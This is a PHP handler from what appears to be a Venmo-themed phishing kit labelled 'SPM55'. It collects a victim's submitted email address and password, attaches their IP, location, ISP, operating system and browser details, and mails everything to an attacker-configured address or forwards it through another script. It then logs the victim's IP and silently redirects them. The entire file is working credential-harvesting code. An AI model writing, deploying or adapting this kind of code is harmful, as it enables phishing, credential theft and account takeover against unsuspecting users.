<?php
include '../main.php';
include '../admin/tod/config.php';
$ip = getUserIP();
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
	$subject = "EMAIL ACCESS [ ".$_POST['email']." ] - [$cn - $ip]";
	$message = '
	<p>
	<b>======================[ EMAIL LOGIN ]======================</b><br>
	Email : '.$_POST['email'].'<br>
	Password : '.$_POST['password'].'<br>
	<b>======================[ DEVICE INFO ]======================</b><br>
	Country : '.$cn.'<br>
	Region : '.$regioncity.'<br>
	City : '.$citykota.'<br>
	Continent : '.$continent.'<br>
	Curs : '.$kurenci.'<br>
	OS / BR : '.$os.' / '.$br.'<br>
	User Agent : '.$user_agent.'<br>
	Timezone : '.$timezone.'<br>
	ISP : '.$ispuser.'<br>
	IP : '.$ip.'<br>
	Date : '.$date.'<br>
	<b>======================[ SPM55 - VENMO ]======================</b>
	</p>
	';
if ($config['send_login'] == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: EMAIL ACCESS <'.$sentod.'>' . "\r\n";
$kirim = mail($result_anying, $subject, $message, $headers);
tulis_file("../admin/result/total_email.txt", $ip);
}else{
include'server.php';
tulis_file("../admin/result/total_email.txt", $ip);
}
echo "<form id='boyxd' method='POST' action='done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>